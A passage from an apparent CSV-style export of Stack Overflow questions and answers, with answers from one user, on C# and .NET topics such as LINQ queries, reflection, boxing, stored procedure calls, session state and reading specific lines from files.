<p>So what is going on under the covers and what does this mean in terms of polymorphism?  I'm told that this facility ""breaks polymorphism"" - and I guess according to the definition, it does.  Is that right?  Would an ""object oriented"" langage like C# really allow you to break one of the core principles of OOP?</p>
","33708","","<p>I answer ""how"" it works. Jon has answered the ""Why"" part.</p>

<p>Calls to <code>virtual</code> methods are resolved a bit differently to those of non-<code>virtual</code> ones. Basically, a <code>virtual</code> method declaration introduces a ""virtual method slot"" in the base class. The slot will hold a pointer to the actual method definition (and the contents will point to an overridden version in the derived classes and no new slot will be created). When the <em>compiler</em> generates code for a virtual method call, it uses the <code>callvirt</code> IL instruction, specifying the method slot to call. The <em>runtime</em> will dispatch the call to the appropriate method. On the other hand, a non-virtual method is called with a <code>call</code> IL instruction, which will be statically resolved to the actual method by the compiler, at compile time (only with the knowledge of the compile-time type of the variable). <code>new</code> modifier does nothing in the compiled code. It essentially tells the C# compiler ""Dude, shut up! I'm sure I'm doing the right thing"" and turns off the compiler warning. </p>

<p>A <code>new</code> method (actually, any method without an <code>override</code> modifier) will introduce a completely separate chain of methods (new method slot). Note that a <code>new</code> method can be <code>virtual</code> itself. The compiler will look at the static type of the variable when it wants to resolve the <em>method chain</em> and the run time will choose the <em>actual method</em> in that specific  chain.</p>
"
"<p>I'm quite new to LINQ.</p>

<p>Suppose that I had the following table:</p>

<pre><code>Incident 

ID DeviceID Time          Info

1    1      5/2/2009    d

2    2      5/3/2009    c

3    2      5/4/2009    b

4    1      5/5/2009    a
</code></pre>

<p>In LINQ, how could I write a query that finds the most recent and distinct (on Device ID) set of incidents? The result I'd like is this:</p>

<pre><code>ID DeviceID Time           Info

3    2      5/4/2009    b

4    1      5/5/2009    a
</code></pre>

<p>Do you have to create an IEqualityComparer to do this?</p>
","33708","","<p>You can get the most recent incidents for each device (this is how I understood your question) with:</p>

<pre><code>var query = 
   incidents.GroupBy(incident =&gt; incident.DeviceID)
            .Select(g =&gt; g.OrderByDescending(incident =&gt; incident.Time).First())
            .OrderBy(i =&gt; i.Time); // only add if you need results sorted
</code></pre>
"
"<p>If I set a breakpoint on a method, how can I see what called the method, when the breakpoint is hit in Visual Studio 2008?</p>
","33708","","<p>Check the Call Stack window (Debug, Windows, Call Stack). Double clicking each entry there will take you to the calling statement. You can also right click on it to enable/disable showing external code items and calls from other threads.</p>
"
"<p><a href=""http://support.microsoft.com/kb/954476"" rel=""nofollow"">Microsoft Source Code Analyzer for SQL Injection (MSSCASI_ASP)</a> is a static code analyzer for classic ASP VBScript code that can help identify pages that might have a sql injection vulnerability.</p>

<p>That tool seems to only support vbscript (""The tool understands only ASP code that is written in VBScript""), and I think it only supports Classic ASP even for VBscript. I'm wondering if there is a tool with a similar approach capable of working with ASP.NET code, especially C# ASP.NET code.</p>
","33708","","<p>I don't think there's a .NET version of that tool. If you are using parameters (which you should do most of the time,) you are not vulnerable to most of the SQL injection attacks.</p>
"
"<p>HI guys,
I was wondering if there is any microsoft class which converts a language like english into german, french etc.
I want to convert some data into specific language.</p>
","33708","","<p>If you are looking for a class built into .NET base class library, no, there's not one as of .NET 4.0 beta 1 and I don't expect something like that included in the framework itself. Microsoft provides a Web service, <a href=""http://www.microsofttranslator.com/Tools/"" rel=""nofollow"">Bing translator</a> that you can use in your application.</p>
"
"<p>How do you initialize an array in C#?</p>
","33708","","<pre><code>var array = new[] { item1, item2 }; // C# 3.0 and above.
</code></pre>
"
"<p>Are <code>char*</code>, <code>int*</code>, <code>long*</code> or even <code>long long*</code> of same size (on a given platform)?</p>
","33708","","<p>Not necessarily. The standard does not guarantee <code>sizeof(double*) == sizeof(int*)</code>. For instance, assume a processor with two address buses with different widths (like on some Harvard architecture processors) it could have pointers with different sizes. </p>
"
"<p>Given the following table:</p>

<pre><code>Length | Width | Color | ID
===========================
    18 |    18 |  blue |  1
---------------------------
    12 |    12 |   red |  1
---------------------------
</code></pre>

<p>I want to produce a single column/row:</p>

<pre><code> SIZES
 =================
 18 x 18, 12 x 12,
</code></pre>

<p>I can do this in SQL as follows:</p>

<pre><code>DECLARE @SIZES VARCHAR(8000)
SELECT @SIZES = COALESCE(@SIZES, '') + Convert(varchar(80), [Length]) + ' x ' + 
                Convert(varchar(80), [Width]) + ', '
FROM table
where ID = 1
GROUP BY [Length], [Width]
ORDER BY [Length], [Width]
SELECT SIZES = @SIZES
</code></pre>

<p>But I cannot figure out how to do this in LINQ.</p>

<p>The closest I got was:</p>

<pre><code>from t in table
where id == 1
group t by new {
                 t.Length,
                 t.Width
               } into g
orderby g.Key.Length, g.Key.Width
select new {
             SIZES = (Convert.ToInt32(g.Key.Length) + "" x "" +
                      Convert.ToInt32(g.Key.Width) + "", "")
           }
</code></pre>

<p>Which produces one column and two rows:</p>

<pre><code>SIZES
========
18 x 18,
12 X 12,
</code></pre>

<p>The converts are unimportant to the problem.  The columns are defined as floats though all are integers.  The key is the COALESCE function I cannot figure out how to do that in LINQ.</p>
","33708","","<p>Try <code>??</code> (<a href=""http://weblogs.asp.net/scottgu/archive/2007/09/20/the-new-c-null-coalescing-operator-and-using-it-with-linq.aspx"" rel=""nofollow"">null coalesce operator</a>) like:</p>

<pre><code>t.Length ?? 0
</code></pre>
"
"<p>I'm trying to create a DDL trigger for a specific table and this is the best I could come up with:</p>

<pre><code>CREATE TRIGGER MyTrigger
ON DATABASE
FOR DDL_TABLE_EVENTS
AS
DECLARE @EventData      xml
SET @EventData=EVENTDATA()

IF @EventData.value('(/EVENT_INSTANCE/ObjectType)[1]', 'varchar(50)')='TABLE'
    AND @EventData.value('(/EVENT_INSTANCE/ObjectName)[1]', 'varchar(50)') ='MyTable'
BEGIN
    --do something special here!!
END
GO
</code></pre>

<p><strong>Is this really the only way to do it?</strong>  I looked everywhere but couldn't find a syntax to create the trigger on a spceific table.  I think it is really silly needing to use the xml EVENTDATA().</p>
","33708","","<p>Yes. It's the way to do it. DDL triggers are associated with the database rather than individual objects. As a consequence, you can't subscribe directly to DDL events happening only on a specific object.</p>
"
"<blockquote>
  <p><strong>Possible Duplicates:</strong><br />
  <a href=""http://stackoverflow.com/questions/963936/gracefully-avoiding-nullpointerexception-in-java"">Gracefully avoiding NullPointerException in Java</a><br />
  <a href=""http://stackoverflow.com/questions/936936/multilingual-fields-in-db-tables"">Multilingual fields in DB tables</a>  </p>
  
  <p><strong>Exact duplicate</strong></p>
  
  <p><a href=""http://stackoverflow.com/questions/963936/gracefully-avoiding-nullpointerexception-in-java"">http://stackoverflow.com/questions/963936/gracefully-avoiding-nullpointerexception-in-java</a></p>
</blockquote>

<p>What do you like more? I just hate seeing the last one. It just seems backwards.</p>

<pre><code>String randomtext = ""stack overflow"";

if(randomtext.equals(""stack overflow""))
{
      //do something
}
</code></pre>

<p>or </p>

<pre><code>String randomtext = ""stack overflow"";

if(""stack overflow"".equals(randomtext))
{
     //do something
}
</code></pre>
","33708","","<p>Contrary to what some people think, these two are <strong>not functionally equivalent.</strong> The first one will throw a <code>NullPointerException</code> if the <code>randomtext</code> is <code>null</code> while the second one won't. This is why I'd choose the latter.</p>
"
"<p>Is a temp table local to the thread or global to the server?</p>
","33708","","<p>Depends on what you mean by ""temp table."" If you mean tables with <code>#</code> prefix, their real name would contain the connection ID and is unique per connection. However, if you are manually creating a table in <code>tempdb</code> database, it'll be treated like all normal tables.</p>
"
"<p>I don't understand what the difference between these 2 variations are.  What is the pros/cons of each approach?</p>

<pre><code>1.  a.MyEvent += new MyClass.MyEventDelegate(FireEvent);

2.  a.MyEvent += FireEvent;
</code></pre>
","33708","","<p>The first one works in all versions of C# while the second only works on 2.0 and above. If you need your to compile you code with C# 1.0 compiler, go with the first one; otherwise, I'd use the more concise version. The generated code should be identical in both cases.</p>
"
"<p>I need to access simultaniously multiple instances of a web services with the following Url. The web services is hosted in IIS and has SSL enabled. </p>

<p><a href=""https://services.mysite.com/data/data.asmx"" rel=""nofollow"">https://services.mysite.com/data/data.asmx</a></p>

<p>Usually, when we do this process manually, we go one by one and update the Windows host file (c:\Windows\System32\drivers\etc\hosts) like this : </p>

<p>192.1.1.100     services.mysite.com</p>

<p>I would like to automate the process and do it with some multithreading. So I cannot change the Host file. Is there a way to simulate a host file when we do a HTTP request in C#?</p>

<p>Thanks!</p>
","33708","","<p>I think you get the same effect by setting the proxy server of that specific request to the IP address of the actual Web server you want to send the request to.</p>
"
"<p>Is there a way to pull out keys from a NameValueCollection that pertain to a certain pattern/naming convention without having to iterate through every value in the collection?</p>
","33708","","<p>A name value collection is not designed to be particularly efficient at searching like that. Whatever method you use, it has to go through all items. You could use LINQ; something like:</p>

<pre><code>col.Keys.OfType&lt;string&gt;().Where(s =&gt; s.StartsWith(""SomeString""))
</code></pre>
"
"<pre><code>private Incident incident = null;

incident = (Incident)(rdc.Incidents.Where(i =&gt; i.ID == ID));
</code></pre>

<p>I get the following exception:</p>

<p>Unable to cast object of type 'System.Data.Linq.DataQuery`1[WPF.Incident]' to type 'WPF.Incident'.</p>

<p>I need an instance of Incident to use it like this:</p>

<pre><code>IList listInjury = ((IListSource)incident.Incident_Injuries.OrderBy(m =&gt; m.Employee.LastName)).GetList();
</code></pre>
","33708","","<p>Try:</p>

<pre><code>incident = rdc.Incidents.First(i =&gt; i.ID == ID);
</code></pre>
"
"<p>I'm just trying reflection :</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Reflection;


public class CTest {
    public string test;
}

public class MyClass
{
    public static void Main()
    {
        CTest cTest = new CTest();
    	Type t=cTest.GetType();
    	PropertyInfo p = t.GetProperty(""test"");
    	cTest.test = ""hello"";
        //instruction below makes crash
    	string test = (string)p.GetValue(cTest,null);

        Console.WriteLine(cTest.GetType().FullName);
    	Console.ReadLine();	
    }
}
</code></pre>
","33708","","<p>""<code>test</code>"" is not a property, it's a field. You should use <code>Type.GetField</code> method to get a <code>FieldInfo</code>:</p>

<pre><code>CTest CTest = new CTest();
Type t = CTest.GetType();
FieldInfo p = t.GetField(""test"");
CTest.test = ""hello"";
string test = (string)p.GetValue(CTest);

Console.WriteLine(CTest.GetType().FullName);
Console.ReadLine();
</code></pre>
"
"<p>How can I list and terminate existing processes in .Net application? Target applications are 1) .Net applications, 2) they are instances of the same executable 3) they have unique Ids but I don't know how to get this information from them, 4) they are spawned externally (i.e. I do not have handles to them as I don't create them).</p>

<p>I want to list all processes, get unique ids from them and restart some of them. I assume that all of them are responsive.</p>
","33708","","<p>You can grab a list of running processes with <a href=""http://msdn.microsoft.com/en-us/library/1f3ys1f9.aspx"" rel=""nofollow""><code>Process.GetProcesses</code></a> static method. You can easily query the return value (possibly with LINQ) to get the ones you want.</p>

<pre><code>System.Diagnostics.Process.GetProcesses()
</code></pre>
"
"<p>I am using SQL Server 2008 Enterprise. I want to see any active SQL Server connections, and the related information of all the connections, like from which IP address, connect to which DB or something.</p>

<p>Any existing tools to solve this issue?</p>
","33708","","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/ms174313.aspx""><code>sp_who</code></a> stored procedure. </p>

<blockquote>
  <p>Provides information about current users, sessions, and processes in an instance of the Microsoft SQL Server Database Engine. The information can be filtered to return only those processes that are not idle, that belong to a specific user, or that belong to a specific session.</p>
</blockquote>
"
"<p>Hi
I would like to convert a list of User's properties into strings array (for json receiver) like:</p>

<pre><code>List&lt;User&gt; users = &lt;..list of users from db...&gt;

var jsonData = (
   from user in users
   select new { user.Id, user.Person.Lastname, user.Person.Firstname });

return Json(jsonData)
</code></pre>

<p>The result is an array named fields</p>

<pre><code>[{""Id"":1,""Lastname"":""Doe"",""Firstname"":""John""},{""Id"":2,""Lastname"":""Smith"",""Firstname"":""Adam""},...]
</code></pre>

<p>but I would like it to be the array of arrays of plain strings like:</p>

<pre><code>[[""1"",""Doe"",""John""]
 [""2"",""Smith"",""Adam""], ...]
</code></pre>

<p>How to cast linq result to strings array?</p>
","33708","","<pre><code>var jsonData = from user in users
               select new[] { user.Id.ToString(),
                              user.Person.Lastname,
                              user.Person.Firstname };
</code></pre>

<p>Alternatively, you can use the lambda syntax:</p>

<pre><code>var jsonData = users.Select(user =&gt; new[] { user.Id.ToString(),
                                            user.Person.Lastname,
                                            user.Person.Firstname });
</code></pre>
"
"<p>Hi
I've often wondered if the following scenario actually happens in c# </p>

<p>If I have a struct but I don't explicitly override any of the methods that derived from object such as ToString(), GetHashCode(), etc then if I declare a local instance of my struct class and call 'ToString()' on it, would my struct get boxed i.e would the CLR convert it implicitly to an object on the heap and then call ToString()? Or is it clever enough to know that there's no implementation for that struct and ignore it?</p>

<p>i.e</p>

<pre><code>public struct Vector2D
{
    public float m_x;
    public float m_y;


    ...... etc
}


void SomeFunc()
{
  Vector2D aVec = new Vector2D();
  Console.WriteLine(aVec.ToString()); // &lt;-- does aVec get boxed here?
  ..... 
}
</code></pre>

<p>== Edit - Update==
Mehrdad's <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.constrained.aspx"">link to MSDN</a>, whilst being useful has confused me slighly.
I'll quote and see if any one can unpick this for me</p>

<blockquote>
  <p>When a callvirt  method instruction
  has been prefixed by constrained 
  thisType, the instruction is executed
  as follows:</p>
  
  <p>If thisType is a reference type (as
  opposed to a value type) then ptr is
  dereferenced and passed as the 'this'
  pointer to the callvirt of method.</p>
  
  <p>If thisType is a value type and
  thisType implements method then ptr is
  passed unmodified as the 'this'
  pointer to a call  method instruction,
  for the implementation of method by
  thisType.</p>
  
  <p><strong>If thisType is a value type and
  thisType does not implement method
  then ptr is dereferenced, boxed, and
  passed as the 'this' pointer to the
  callvirt  method instruction.</strong></p>
</blockquote>

<p>So does that mean that if I don't explicitly implement ToString() on my struct type that it will fall into the last case and get boxed? Or am I mis-understanding it somewhere?</p>
","33708","","<p>No it's not boxed when you call <code>ToString</code> or <code>GetHashCode</code> if it's implemented by your struct (<a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.constrained.aspx"" rel=""nofollow"">why should it? <code>constrained</code> IL instruction takes care of it</a>.) It's boxed when you call a non-virtual method (or a virtual method not overriden in the struct) on <code>System.Object</code> (its base class), i.e. <code>GetType</code>/<code>MemberwiseClone</code>.</p>

<p><strong>UPDATE:</strong> Sorry for the misunderstanding it may have caused. I wrote the answer with overriding the methods in the struct in mind (that's why I mentioned non-virtual methods need boxing, I should have been more explicit not to confuse readers, especially since I missed your statement regarding not overriding the method) as if you don't override it, the <code>Object.ToString</code> method <strong>expects</strong> it's first argument (reference to <code>this</code>) to be a reference type (an <code>Object</code> instance). Obviously, the value has to be boxed in that call (as it's a call in the base class.) </p>

<p>However, the point is, the nature of calling a virtual method on a value type <strong>does not</strong> result in emitting the <code>box</code> instruction (unlike non-virtual methods on <code>Object</code> that always result in emitting an explicit <code>box</code> instruction.) It's the <code>callvirt</code> instruction that will do the boxing if it has to resort to the <code>Object.ToString</code> implementation (as you mentioned in the updated question) just like when you are passing a struct to a method that expects an <code>object</code> parameter.</p>
"
"<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;time.h&gt;

static struct tm createDate(unsigned day, unsigned mon, int year) {
       struct tm b = {0,0,0,day,mon-1,year-1900}; return b; 
}

static int dateExceeded(unsigned day, unsigned mon, int year) {
    struct tm b = createDate(day,mon,year); 
    time_t y = mktime(&amp;b), now; 
    time(&amp;now);  // error C2143: syntax error : missing ';' before 'type'
    double diff = difftime(y, now) / (60 * 60 * 24);  // error C2065: 'diff' : undeclared identifier
    return (diff &lt; 0); 
}

static void randomEvent(){
    srand(time(NULL));
    if ( rand()%10) {
            printf(""Do something here\n""); // C2143: syntax error : missing ';' before 'type'
  } 
}
</code></pre>
","33708","","<p>If you are compiling this as C89 code, you should declare variables at the beginning of blocks. You can't declare <code>double diff</code> at the middle of the block:</p>

<pre><code>static int dateExceeded(unsigned day, unsigned mon, int year) {
    double diff;
    struct tm b = createDate(day,mon,year); 
    time_t y = mktime(&amp;b), now; 
    time(&amp;now); 
    diff = difftime(y, now) / (60 * 60 * 24);
    return (diff &lt; 0); 
}
</code></pre>
"
"<p>I would like to open multiple download dialog boxes after the user clicks on a link.</p>

<p>Essentially what I am trying to do is allow the user to download multiple files. I don't want to zip up the files and deliver one zipped file because that would require a lot of server resources given that some of the files are some what large.</p>

<p>My guess is that there may be some way with javascript to kick off multiple requests when the user clicks on a certain link. Or maybe there might be a way on the server side to start off another request.</p>
","33708","","<p>Unless the client is configured to automatically download files, you can't accomplish this without packaging the files in a single response (like ZIP solution you mentioned.) This would be a security issue if a Web site would be able to put arbitrarily large number of files on your disk without telling you.</p>

<p>By the way, you might be overestimating the cost of packaging in a single file. Streaming files is usually an I/O-bound operation. There should be enough CPU cycles to spare for piping the data through some storage(tar)/compression(zip) methods.</p>
"
"<p>I have what might be more of a math question but this question is stemming from reading my computer systems book in the chapter on Virtual Memory... so I feel justified asking it here. </p>

<p>The book states:</p>

<blockquote>
  <p>Each virtual page is <em>P</em> = 2<sup>p</sup> bytes in size.</p>
</blockquote>

<p>My algebra is rusty which is probably the reason I need to ask this. Now, for an example that I'm looking at, we know that <code>P = 1024</code>. Does this mean that I can figure out what <code>p</code> is by simply identifying which <code>p</code> will make <blockquote>1024 = 2<sup>p</sup></blockquote> true?</p>

<p>If my epiphany is true and correct, then 1024 = 2<sup>10</sup> should be my answer. That is <code>P=1024</code> and <code>p=10</code>. </p>
","33708","","<p>I think this question is on the borderline of not programming related but anyway, the inverse of <code>f(x)=a</code><sup><code>x</code></sup> is <code>g(x)=log(x)/log(a)</code>. You just need to get the base 2 logarithm of P=1024 to find <code>p</code>, which is 10.</p>
"
"<p>When you run Linq to Sql or Linq to Entites to get a list of records it runs query to select all fields from a table. Is it an efficient solution. Lets say: I run this LINQ</p>

<pre><code>dim lstCustomers = from c in db.Customers select c
</code></pre>

<p>it run query to get all fields from a table whether i need all fields or not. I am using asp.net with MVC so should i write this query in view (where i only need CustomerID and name)</p>

<pre><code>    dim lstCustomers = from c in db.Customers _
                       select new Customer with { c.CustomerID, c.Name }
</code></pre>

<p>If i have to use 2nd query then whats the advantage of LINQ and Entity Framework. This thing i can do with SQL query (with different syntax)</p>

<p>Anyone can help?</p>
","33708","","<p>First of all, LINQ queries are evaluated lazily. That means that single line doesn't do anything but itself, so I assume you actually iterate the results with <code>For Each</code>.</p>

<p>The answer to your first question is yes, all fields are retrieved from the database with the first statement.</p>

<p>Yes, but in order to use SQL directly, you'll have to manually create entity classes, manually retrieve data using <code>SqlDataReader</code> or something to achieve the level of abstraction LINQ provides in that line. That's lots of more work on your behalf. With LINQ to SQL, you don't even need to explicitly write code to open a connection to database.</p>
"
"<p>I've never seen this before, I've always known there was either GET or POST. And I can't find any good documentation.</p>

<p>GET send variables via the URL.
POST send it via the file body?</p>

<p>What does HEAD do?</p>

<p>It doesn't get used often, am I correct?</p>

<p>W3schools.com doesn't even mention it.</p>
","33708","","<p>The HEAD method is used to send the request and retrieve just the HTTP header as response. For example, a client application can issue a HEAD request to check the size of a file (from HTTP headers) without downloading it. As Arjan points out, it's not even valid in HTML forms.</p>
"
"<p>Let's say I have a constructor like this:</p>

<pre><code>MyColor(uint8 vec[]) {
r = vec[0];
g = vec[1];
b = vec[2];
a = vec[3];
}
</code></pre>

<p>But I call it like this (3 elements instead of 4):</p>

<pre><code>uint8 tmp[] = {1,2,3};
MyColor c(tmp);
</code></pre>

<p>But now <code>vec[3]</code> is undefined... is it safe to assign this value to <code>a</code>? If not, there's no nice workaround to check if <code>vec[3]</code> is set is there?</p>
","33708","","<p>No it's not safe. It's undefined behavior as defined by the standard. It might blow the whole app up or return a random value. The workaround is to pass the size along with it, or use <code>vector</code> instead.</p>
"
"<p>is it possible to initialize a class by a string variable? I have code in PHP.</p>

<pre><code>&lt;?php
  $classname = ""test"";

  $oTest = new $classname();

  class test{
  }
?&gt;
</code></pre>

<p>how do I do this in c#?</p>
","33708","","<pre><code>System.Activator.CreateInstance(Type.GetType(className))
</code></pre>

<p>The problem, however, is that C# 3.0 is a statically typed language. You can't just call random methods on the returned object. You can have the classes you might instantiate implement some common interface and cast the result of the above expression to the interface or manually use reflection to call methods on the returned object.</p>
"
"<p>.NET provides four very similar versions of <code>String.Format(...)</code> (excluding the one that takes an <code>IFormatProvider</code> argument):</p>

<p><code>Format(String, Object)</code><br />
Replaces one or more format items in a specified string with the string representation of a specified object.<br />
<code>Format(String, Object, Object)</code><br />
Replaces the format item in a specified string with the string representations of two specified objects. 
<code>Format(String, Object, Object, Object)</code><br />
Replaces the format items in a specified string with the string representation of three specified objects. 
<code>Format(String, Object[])</code><br />
Replaces the format item in a specified string with the string representation of a corresponding object in a specified array. </p>

<p>Why not have just the one with a <code>(params) object[]</code> argument? Is there a performance gain for separate methods with a fixed number of parameters (1, 2 and 3)?<br />
Presumably, most calls to string.Format in the real world have 1-3 parameters.</p>
","33708","","<p>Yes. There is a performance difference associated with building an array and passing that one instead of simply passing individual arguments on stack. Also, since .NET is designed to support many languages, they might have been doing this to support normal <code>String.Format</code> syntax for some possible hypothetical language that didn't support automatically packing <code>params</code> array parameters.</p>
"
"<p>I have a <code>Dictionary</code> that for most operations I just need to retrieve a single entry by key, but for a few operations I will need to work with the entries associated with a range of keys. The way that occurs to me to do this is to use <code>GetKeys</code> and a <code>FindAll</code> that will match the range I am interested in, but was wondering if someone could suggest a better method. </p>
","33708","","<p>A <code>Dictionary</code> which is implemented as a hash table is not particularly suited to efficiently perform range selection operations on keys. You'll have to visit all keys to find all of them in a specified range. A nice way to accomplish it is to query its collection of keys with a simple LINQ expression.</p>
"
"<p>would this be possible? (I don't have vs. 2010, so I can't try it myself, sorry)</p>

<pre><code>public interface IComplexList&lt;out TOutput, in TInput&gt; where TOutput : TInput
{
    public IEnumerator&lt;TOutput&gt; GetEnumerator();
    public void Add(TInput item);
}

public interface IList&lt;T&gt; : IComplexList&lt;T, T&gt;
{
}
</code></pre>

<p>If I get it right, you could use this to actually implement covariance and contravariance in the same interface.</p>
","33708","","<p>No, you can't. In your example <code>IList&lt;T&gt;</code> is invariant. <code>IList&lt;T&gt;</code> would require to declare <code>in</code>/<code>out</code> to be covariant/contravariant. It's not possible to do that just by inheriting some interface that is covariant.</p>
"
"<p>is it possible to store list to session variable in Asp.net C# ?</p>
","33708","","<p>Yes, you can store any object (I assume you are using ASP.NET with default settings, which is in-process session state):</p>

<pre><code>Session[""test""] = myList;
</code></pre>

<p>You should cast it back to the original type for use:</p>

<pre><code>var list = (List&lt;int&gt;)Session[""test""];
// list.Add(something);
</code></pre>

<p>As Richard points out, you should take extra care if you are using other session state modes (e.g. SQL Server) that require objects to be serializable.</p>
"
"<p>I want to execute this stored procedure from a C# program.</p>

<p>I have written the following stored procedure in a SqlServer query window and saved it as 
stored1:</p>

<pre><code>use master 
go
create procedure dbo.test as

DECLARE @command as varchar(1000), @i int
SET @i = 0
WHILE @i &lt; 5
BEGIN
Print 'I VALUE ' +CONVERT(varchar(20),@i)
EXEC(@command)
SET @i = @i + 1
END
</code></pre>

<p><b>EDITED:</b></p>

<pre><code>using System;
using System.Collections.Generic;
using System.Text;
using System.Data;
using System.Data.SqlClient;
namespace AutomationApp
{
    class Program
    {
        public void RunStoredProc()
        {
            SqlConnection conn = null;
            SqlDataReader rdr  = null;

            Console.WriteLine(""\nTop 10 Most Expensive Products:\n"");

            try
            {
                conn = new SqlConnection(""Server=(local);DataBase=master;Integrated Security=SSPI"");
                conn.Open();
                SqlCommand cmd = new SqlCommand(""dbo.test"", conn);
                cmd.CommandType = CommandType.StoredProcedure;
                rdr = cmd.ExecuteReader();
                /*while (rdr.Read())
                {
                    Console.WriteLine(
                        ""Product: {0,-25} Price: ${1,6:####.00}"",
                        rdr[""TenMostExpensiveProducts""],
                        rdr[""UnitPrice""]);
                }*/
            }
            finally
            {
                if (conn != null)
                {
                    conn.Close();
                }
                if (rdr != null)
                {
                    rdr.Close();
                }
            }
        }
        static void Main(string[] args)
        {
            Console.WriteLine(""Hello World"");
            Program p= new Program();
            p.RunStoredProc();      
            Console.Read();
        }
    }
}
</code></pre>

<p>This displays the exception <code>Cannot find the stored procedure dbo.test</code>. Do I need to provide the path? If yes, in which location should the stored procedures be stored?</p>
","33708","","<pre><code>using (var conn = new SqlConnection(connectionString))
using (var command = new SqlCommand(""ProcedureName"", conn) { 
                           CommandType = CommandType.StoredProcedure }) {
   conn.Open();
   command.ExecuteNonQuery();
   conn.Close();
}
</code></pre>
"
"<p>Can anyone point to best algorithm for substring search in another string?
or search for a char array in another char array?</p>
","33708","","<p>The best from what point of view? <a href=""http://en.wikipedia.org/wiki/Knuth-Morris-Pratt%5Falgorithm"" rel=""nofollow"">Knuth-Morris-Pratt</a> is a good one. You can find more of them discussed on <a href=""http://en.wikipedia.org/wiki/String%5Fsearching%5Falgorithm"" rel=""nofollow"">the Wikipedia entry for string searching algorithms</a>. </p>
"
"<p>I have been writing code without realizing WHY I can access constant values within static 
methods. <br /></p>

<p>Why is it possible to access <code>const</code> values without declaring it as <code>static</code>?</p>

<p>E.g.) It's legal to call <code>IMAGE_FILE_EXTENSION</code> within <code>AddImageToDocument(...)</code> <br /></p>

<pre><code>public abstract class ImageDocumentReplacer : DocumentReplacer
{
    private const string IMAGE_FILE_EXTENSION = "".tif"";

    private static void AddImageToDocument(int documentId, string separatedPath)
    {
        Console.WriteLine(IMAGE_FILE_EXTENSION);
    }
}
</code></pre>
","33708","","<p><code>const</code> members are implicitly <code>static</code>. They belong to the class rather than a specific instance. As a consequence, you can't use <code>this.myConstant</code> but <code>MyClass.myConstant</code>.</p>

<p>Quoting the C# 3.0 specification (section Â§10.4 Constants):</p>

<blockquote>
  <p>Even though <strong>constants are considered <code>static</code> members</strong>, a <em>constant-declaration</em> <strong>neither requires nor allows</strong> a <code>static</code> modifier. It is an error for the same modifier to appear multiple times in a constant declaration.</p>
</blockquote>
"
"<p>I have code like:</p>

<pre><code>var t = SomeInstanceOfSomeClass.GetType();
((t)SomeOtherObjectIWantToCast).someMethodInSomeClass(...);
</code></pre>

<p>That won't do, the compiler returns an error about the (t) saying Type or namespace expected.
How can you do this?</p>

<p>I'm sure it's actually really obvious....</p>
","33708","","<p>I've answered a duplicate question <a href=""http://stackoverflow.com/questions/972636/casting-a-variable-using-a-type-variable"">here</a>. However, if you just need to call a method on an instance of an arbitrary object in C# 3.0 and below, you can use reflection:</p>

<pre><code>obj.GetType().GetMethod(""someMethodInSomeClass"").Invoke(obj);
</code></pre>
"
"<p>I know how to fill a datatable with dAdapter.Fill(dTable) using System.Data.OleDb</p>

<p>But it's heavy if I just want to retrieve a single string value like ""select name from table where idperson = 1""</p>

<p>Can't I bypass creating a DataTable ?</p>

<p>I want to create an equivalent of dlookup function in MS Access.</p>
","33708","","<pre><code>using (var conn = new OleDbConnection(...))
using (var cmd = new OleDBCommand(""select ..."", conn)) {
   conn.Open();
   object result = cmd.ExecuteScalar(); // cast to appropriate type
   conn.Close();
}
</code></pre>
"
"<p>I have a method I need to run on Session_end. Is there any way I can ensure the code runs when a user closes his browser? This may be a dup queston. I saw one response doing a call to ajax unload or something, but I don't want this to fire everytime a user navigates away from a page, just when they close their browser.</p>

<p>Thanks,
~ck</p>
","33708","","<p>Simple answer: You can't control user's browser. The AJAX solution you mentioned is the closest you can achieve (without a plugin/custom client.) Imagine some Web site could track every time you opened and closed your browser window. Don't you think it would be a privacy issue?</p>

<p>The truth lies in the stateless nature of HTTP. The Web server is out of the picture as soon as it finishes sending the response to the client. After that, all you can rely on is a client side script (which only executes because the client wants it to; and it can easily choose not to run scripts.)</p>
"
"<p>Given a text file, how would I go about reading an arbitrary line and nothing else in the file?</p>

<p>Say, I have a file test.txt.  How would I go about reading line number 15 in the file?</p>

<p>All I've seen is stuff involving storing the entire text file as a String array and then using the value of the line number as the number of the String to use from the array... but there are some complications: The text file is enormously huge and the machine that the application I'm coding isn't exactly a top-notch system. Speed isn't the top priority, but it is definitely a major issue.</p>

<p>Are there any ways to <strong>ONLY</strong> read a specific line of a text file and store the result as a string?</p>

<p>Thanks for your responses:
The file is KINDA structured. It's got 25 lines of info and then <em>X</em> lines of numbers but line 17 of the first 25 has the value of <em>X</em>.</p>

<p>But then, there's 1 blank line and it repeats itself all over as a second record in the file and <em>X</em> can have a different value for each record.</p>

<p>What I want to do is read and store the first 25 lines as independent values and then store the next <em>X</em> (usually around 250) lines as an array. Then I'm going to store it in an SQL database and repeat with the NEXT record until I reach the <em>Y</em>th record (the number of records in the file is in line 3)</p>

<p><strong>EDIT 2</strong>:
Alright, I think I've gotten to a solution based on a combination of your alls' responses.</p>

<p>I'm going to read the first 25 lines and store it as an array. I'll copy the pertinent contents of the array to local variables then I'll delete the first 25 lines. Then, I can use the info to store the next <em>X</em> lines (the value of item 13 in the array) as an array, serialize it, store it in a database then delete the lines that I just read.</p>

<p>I could then repeat the process for each subsequent record.</p>

<p>Of course, this relies on one assumption I'm making, which to be honest, I'm not sure is true. Is it possible to delete the first <em>n</em> lines from a text file from within C# without having to read the entire thing and re-write it without the first <em>n</em> lines?</p>
","33708","","<p><strong>.NET 4.0 edit</strong></p>

<p>Since .NET 4.0, it is possible to access a single line of a file directly. For instance, to access line 15:</p>

<pre><code>string line = File.ReadLines(FileName).Skip(14).Take(1).First();
</code></pre>

<p>This will return only the line required</p>

<hr>

<p>Since you can't predict the location (can you?) of the i-th line in the file, you'll have to read all previous lines too. If the line number is small, this can be more efficient than the <code>ReadAllLines</code> method.</p>

<pre><code>string GetLine(string fileName, int line)
{
   using (var sr = new StreamReader(fileName)) {
       for (int i = 1; i &lt; line; i++)
          sr.ReadLine();
       return sr.ReadLine();
   }
}
</code></pre>
"
